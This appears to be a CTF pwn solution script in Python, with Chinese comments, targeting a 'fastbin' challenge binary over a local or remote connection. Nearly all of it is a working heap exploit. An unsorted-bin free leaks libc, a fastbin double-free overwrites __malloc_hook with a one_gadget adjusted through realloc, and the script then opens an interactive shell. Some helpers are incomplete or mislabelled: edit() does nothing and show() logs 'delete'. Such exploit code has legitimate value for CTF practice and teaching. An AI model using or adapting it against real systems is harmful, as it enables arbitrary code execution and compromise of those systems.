import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./fastbin',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf


def add(data: bytes, size: int = -1):
    if size == -1:
        size = len(data)
    warning(f'add({size}):{data}')
    sla('>', '1')
    sla('Size:', str(size))
    sa('Data:', data)


def delete(idx: int):
    warning(f'delete({idx})')
    sla('>', '2')
    sla('Idx:', str(idx))


def show(idx: int):
    warning(f'delete({idx})')
    sla('>', '3')
    sla('Idx:', str(idx))


def edit(idx: int, data: bytes, size: int = -1):
    if size == -1:
        size = len(data)


SIZE_EXP = 0x60
POP_OFFSET = 0  # 用于当onegadgets 不符合条件时候调整栈 ∈  # 0 2 4 6 8 11 12
# 1. 申请一个大堆使得其可以进unsortbin 0x100
# 2. 中间放一个小堆使得释放的时候不会被合并 0x20
# 3. 申请2个SIZE_EXP的堆用于后续利用
# 4. 删除大堆，此时大堆的头将变为堆管理器赋值的libc地址偏移
# 4.1 使用`bins`查看该地址main_arean+xx偏移
# 4.2 同时main_arena_malloc_hook和main_arena固定差-0x10
# 4.3 libc_base = xx - 0x10 + main_arena_malloc_hook - libc.symbols['__malloc_hook']
# 5. 释放A，释放B（防合并），释放A。使得A被double-free
# 6. 再次申请A并将地址写为 libc_base + libc_0x7f_pos
# 6.1 libc_0x7f_pos = libc.symbols['__malloc_hook'] - 0x28（魔术字） + 0x5（0x00007f 8位的后5位)
# 7. 再次申请B，申请A。此时A的大小将变为 sizeof(CHUNK_HEAD) + SIZE_EXP

# leak libc
add(size=0x100, data='abitrary')  # 0
add(size=0x20, data='abitrary')  # 1
add(size=SIZE_EXP, data='abitrary')  # 2-A
add(size=SIZE_EXP, data='abitrary')  # 3-B
# A-B-A
delete(0)
show(0)
attach(client.client)
libc = ELF('./libc_action/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
print(rl())
gdb_offset = 88
# 通过gdb调试看main_arena对应libc的多少
# unsortedbin
# all: 0xd2a000 —▸ 0x7fa4e3b55b78 (main_arena+88) ◂— 0xd2a000
main_arena_malloc_hook_offset = -0x10
libc_base = u64(rl()[:-1].ljust(8, b'\x00')) - gdb_offset + \
    main_arena_malloc_hook_offset - libc.symbols['__malloc_hook']
log.success(f'libc: {hex(libc_base)}')

# fastbin attack
delete(2)
delete(3)
delete(2)  # double-free A 使得A上伪造的地址被用上
libc_0x7f_pos = libc.symbols['__malloc_hook'] - 0x23
# 重新申请回A使得A.fd == libc_base + libc_0x7f_pos
add(size=0x60, data=p00(libc_base + libc_0x7f_pos))
add(size=0x60, data='abitrary')
add(size=0x60, data='abitrary')  # 获取libc上伪造的堆

one = 0xf1247
# 不考虑栈环境的
# add(0x60, b'AAA' + p64(0) * 2 + p64(libc_base + one))
# 考虑栈环境的
# __GI___libc_realloc开始用于修改栈位置
try_offset = POP_OFFSET  # 0 2 4 6 8 11 12
add(size=0x60, data=b'AAA' + p00(0) * 1 + p00(libc_base + one) +
    p00(libc_base + libc.symbols['realloc'] + try_offset))


sla('>', '1')
sla('Size:', str('1'))
interactive()
